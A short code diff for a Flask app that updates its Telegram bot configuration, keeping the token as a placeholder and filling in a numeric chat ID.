@@ -10,8 +10,8 @@ logging.basicConfig(level=logging.INFO)
 app = Flask(__name__)
 
 # ========== CONFIGURE YOUR TELEGRAM ==========
-BOT_TOKEN = "YOUR_BOT_TOKEN"   # <-- PASTE YOURS
-CHAT_ID = "YOUR_CHAT_ID"       # <-- PASTE YOURS
+BOT_TOKEN = "YOUR_BOT_TOKEN"   # <-- replace with your actual token (the long one from BotFather)
+CHAT_ID = "7904798576"         # <-- paste the chat_id you just found
 # =============================================
 
 HTML_PAGE = '''<!DOCTYPE html>
